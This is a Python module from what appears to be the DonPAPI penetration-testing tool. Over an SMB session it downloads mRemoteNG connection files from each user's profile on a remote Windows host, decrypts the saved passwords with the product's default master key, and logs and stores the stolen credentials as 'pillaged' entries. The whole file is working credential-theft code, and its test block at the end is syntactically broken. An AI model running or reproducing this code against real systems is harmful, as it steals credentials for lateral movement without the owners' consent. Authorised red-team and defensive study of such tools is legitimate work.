#!/usr/bin/env python
# coding:utf-8
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#From : https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py

import ntpath
from donpapi.lib.toolbox import bcolors
import hashlib
import base64
from Cryptodome.Cipher import AES
import xml.etree.ElementTree as ET


class mRemoteNG():
    def __init__(self,smb,myregops,myfileops,logger,options,db,users):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.users = users
        self.smb = smb


    def run(self):
        self.get_files()
        #self.process_files()
        #self.decrypt_all()

    def get_files(self):
        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKBLUE}[+] Gathering mRemoteNG Secrets {bcolors.ENDC}")
        blacklist = ['.', '..']

        user_directories = [("Users\\{username}\\AppData\\Local\\mRemoteNG", ('confCons.xml','mRemoteNG.exe.config')),
                            ("Users\\{username}\\AppData\\Roaming\\mRemoteNG", ('confCons.xml','mRemoteNG.exe.config'))]
        machine_directories = [("Program Files (x86)\\mRemoteNG\\", 'mRemoteNG.exe.config'),
                               ("PROGRAMFILES\\mRemoteNG\\", 'mRemoteNG.exe.config'),
                               ]

        for user in self.users:
            self.logging.debug(
                f"[{self.options.target_ip}] Looking for {user.username} ")
            if user.username == 'MACHINE$':
                continue
                #directories_to_use = machine_directories
            else:
                directories_to_use = user_directories

            for info in directories_to_use:
                my_dir, my_mask = info
                tmp_pwd = my_dir.format(username=user.username)
                self.logging.debug(f"[{self.options.target_ip}] Looking for {user.username} files in {tmp_pwd} with mask {my_mask}")
                for mask in my_mask:
                    my_directory = self.myfileops.do_ls(tmp_pwd, mask, display=False)
                    for infos in my_directory:
                        longname, is_directory = infos
                        self.logging.debug("ls returned file %s" % longname)
                        if longname not in blacklist and not is_directory:
                            try:
                                # Downloading file
                                localfile = self.myfileops.get_file(ntpath.join(tmp_pwd, longname), allow_access_error=True)
                                self.process_file(localfile,user.username)
                            except Exception as ex:
                                self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception in DownloadFile {localfile}{bcolors.ENDC}")
                                self.logging.debug(ex)



    def process_file(self,localfile,username):
        try:
            if "confCons.xml" in localfile:
                tree = ET.parse(localfile)
                root = tree.getroot()
                #Extraire l'element Username et Password pour chaque node
                for node in list(root):
                    try:
                        name=node.attrib['Name']
                        username_=node.attrib['Domain']+'\\'+node.attrib['Username']
                        destination=node.attrib['Protocol']+'://'+node.attrib['Hostname']+':'+node.attrib['Port']
                        encrypted_password=node.attrib['Password']
                        encrypted_data = encrypted_password.strip()
                        encrypted_data = base64.b64decode(encrypted_data)

                        salt = encrypted_data[:16]
                        associated_data = encrypted_data[:16]
                        nonce = encrypted_data[16:32]
                        ciphertext = encrypted_data[32:-16]
                        tag = encrypted_data[-16:]
                        default_password="mR3m"
                        self.logging.debug(
                            f"[{self.options.target_ip}] [mRemoteNG] Decrypting with {salt}:{nonce} {ciphertext} {tag}@ {username_}@ {destination}")

                        key = hashlib.pbkdf2_hmac("sha1", default_password.encode(), salt, 1000, dklen=32)

                        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                        cipher.update(associated_data)
                        plaintext = cipher.decrypt_and_verify(ciphertext, tag).decode('utf8')
                        self.logging.info(f"[{self.options.target_ip}] {bcolors.OKGREEN} [mRemoteNG] {bcolors.OKBLUE}{username_}:{plaintext} @ {destination}{bcolors.ENDC}")

                        self.db.add_credz(credz_type='MRemoteNG',credz_username=f"{username_}",credz_password=plaintext,credz_target=str(destination),credz_path=localfile,pillaged_from_computer_ip=self.options.target_ip, pillaged_from_username=username)
                    except Exception as ex:
                        self.logging.debug(
                            f"[{self.options.target_ip}] {bcolors.WARNING}Exception in mRemoteNG Process Node of {localfile}{bcolors.ENDC}")
                        self.logging.debug(ex)
                        continue
                return 1
        except Exception as ex:
            self.logging.debug(
                f"[{self.options.target_ip}] {bcolors.WARNING}Exception in mRemoteNG ProcessFile {localfile}{bcolors.ENDC}")
            self.logging.debug(ex)


if __name__ == "__main__":
    filename="/Users/pav/Documents/CloudStation/Hack/Login/TI/NUMEN/interne/dpp/test4/10.75.0.2/Users/solivi08/AppData/Roaming/mRemoteNG/confCons.xml"
    #hash=binascii.unhexlify(hash)
    a=mRemoteNG()
    a.
    a.reverse_vncpassword(hash=hash)